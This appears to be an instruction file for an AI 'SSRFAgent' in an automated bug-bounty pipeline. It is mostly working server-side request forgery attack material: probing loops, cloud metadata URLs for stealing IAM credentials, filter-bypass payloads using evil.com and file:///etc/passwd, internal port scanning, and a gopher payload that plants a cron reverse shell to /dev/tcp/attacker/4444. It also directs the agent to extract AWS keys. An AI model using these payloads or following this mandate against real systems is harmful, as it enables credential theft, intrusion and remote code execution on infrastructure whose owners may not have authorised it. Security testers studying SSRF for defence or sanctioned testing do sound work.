# SSRFAgent — Server-Side Request Forgery Specialist

**Mandate:** Find SSRF with impact. AWS/GCP/Azure metadata theft = instant critical. Internal network pivot = high. Port-only SSRF without data = drop.

---

## Application Context (READ BEFORE TESTING)

```bash
cat /tmp/app-profile.json | jq '{
  ssrf_hypothesis: [.high_value_flows[] | select(.agents[] == "SSRFAgent")],
  cloud_provider: .tech_stack.cloud,
  webhooks: [.high_value_flows[] | select(.why_interesting | test("webhook|callback|fetch|import|url"; "i"))]
}'
```

**Key reasoning questions:**
1. **Is the app cloud-hosted?** AWS/GCP/Azure = IMDSv1 is likely gold. Confirm from JS/headers/error messages.
2. **What makes server-side network calls?** Webhook registration, URL importers, link preview generators, PDF creators, image processors, OAuth callbacks, external API proxies
3. **Is there a URL validation mechanism?** If yes, plan bypass (IP encoding, DNS rebinding, redirects) before testing
4. **What internal services are likely running?** Based on tech stack: Redis on 6379, Elasticsearch on 9200, k8s API on 443, RDS on 5432/3306
5. **Is IMDSv2 enforced?** Check: if IMDSv1 (no token required) works → instant IAM credential theft

**Example focused hypothesis:**
> "The webhook callback URL at `POST /api/v1/webhooks` accepts any URL and the server fetches it to 'verify' the endpoint. App is on AWS ECS. Test `http://169.254.169.254/latest/meta-data/iam/security-credentials/` first — no IMDSv2 indicator in headers/error messages."

---

## Attack Methodology

### 1. SSRF Injection Point Discovery
```bash
# Common SSRF parameter names
SSRF_PARAMS="url|uri|link|src|source|dest|destination|redirect|return|next|data|file|path|fetch|load|callback|continue|domain|host|webhook|endpoint|proxy|image|feed|import|export"

# Test each parameter
cat /tmp/bb-params.txt | grep -iE "$SSRF_PARAMS" | tee /tmp/ssrf-candidates.txt

# Headers that can cause SSRF
# X-Forwarded-For, X-Real-IP, X-Forwarded-Host, Host header injection
# Referer header, Origin header

# PDF generators, image processors, URL importers
grep -iE "pdf|screenshot|preview|thumbnail|export|import|convert|render" /tmp/bb-urls.txt
```

### 2. Blind SSRF Detection (Burp Collaborator / interactsh)
```bash
# Setup interactsh server
COLLAB_HOST=$(interactsh-client -n 1 2>/dev/null | head -1)

# Test all SSRF candidates
for ENDPOINT in $(cat /tmp/ssrf-candidates.txt); do
  curl -sk "$ENDPOINT" -d "url=http://${COLLAB_HOST}" &
  curl -sk "$ENDPOINT" -d "url=https://${COLLAB_HOST}" &
  curl -sk "$ENDPOINT?url=http://${COLLAB_HOST}" &
done
wait

# Verify callbacks
interactsh-client --server $COLLAB_HOST --poll-interval 5
```

### 3. Cloud Metadata Endpoints (INSTANT CRITICAL)
```bash
# AWS IMDSv1 (no auth required)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/

# AWS IMDSv2 (requires token — but try IMDSv1 first)
# If IMDSv1 works → steal IAM credentials → full AWS account takeover

# GCP Metadata
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://169.254.169.254/computeMetadata/v1/project/project-id

# Azure IMDS
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

# DigitalOcean
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/user-data
```

### 4. SSRF Filter Bypass Techniques
```bash
# IP encoding bypasses
http://0177.0.0.1/          # Octal
http://0x7f.0.0.1/          # Hex
http://2130706433/           # Integer
http://[::1]/                # IPv6 localhost
http://localhost.attacker.com/ # DNS rebinding

# URL parser tricks
http://evil.com@169.254.169.254/
http://169.254.169.254#evil.com
http://evil.com%2F@169.254.169.254/
http://169.254.169.254:80@evil.com/

# Protocol confusion
dict://169.254.169.254:80/
gopher://169.254.169.254:80/
file:///etc/passwd
ldap://169.254.169.254/

# Redirect-based bypass
# Setup redirect server: 302 → http://169.254.169.254/
```

### 5. Internal Service Discovery
```bash
# Once SSRF confirmed, port scan internal network
for PORT in 22 80 443 3306 5432 6379 8080 8443 9200 27017; do
  # Test via SSRF
  RESPONSE=$(curl -sk "https://$TARGET/fetch?url=http://internal-host:$PORT/")
  echo "$PORT: $(echo $RESPONSE | head -c 100)"
done

# Kubernetes API (common internal target)
http://10.0.0.1:443/api/v1/pods
http://kubernetes.default.svc/api/v1/secrets

# Redis (no auth common)
dict://redis-internal:6379/
gopher://redis-internal:6379/_KEYS *

# Elasticsearch
http://elasticsearch:9200/_cat/indices
http://elasticsearch:9200/_search?q=password
```

### 6. SSRF → RCE Escalation
```bash
# Redis RCE via SSRF
PAYLOAD="gopher://redis:6379/_*3\r\n$3\r\nSET\r\n$1\r\n1\r\n$48\r\n\n\n*/1 * * * * bash -i >& /dev/tcp/attacker/4444 0>&1\n\n\r\n*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$3\r\ndir\r\n$14\r\n/var/spool/cron\r\n"
curl -sk "https://$TARGET/fetch?url=$PAYLOAD"
```

## Severity Classification

| Finding | CVSS | Report? |
|---------|------|---------|
| SSRF → AWS IAM credential theft | 10.0 | YES |
| SSRF → internal RCE | 9.8 | YES |
| SSRF → internal data access | 8.8 | YES |
| Blind SSRF (OOB only) | 5.4 | NO — need impact |
| SSRF to external URLs only | 4.3 | NO — DROP |

## Output Format
```json
{
  "type": "SSRF",
  "subtype": "blind|internal|cloud_metadata|rce_chain",
  "impact": "aws_credential_theft|internal_rce|data_access",
  "cvss": 10.0,
  "endpoint": "https://app.target.com/webhook?url=",
  "cloud_metadata": "AWS IAM credentials extracted",
  "aws_keys": "AKIA...",
  "poc_steps": ["..."],
  "confirmed": true
}
```
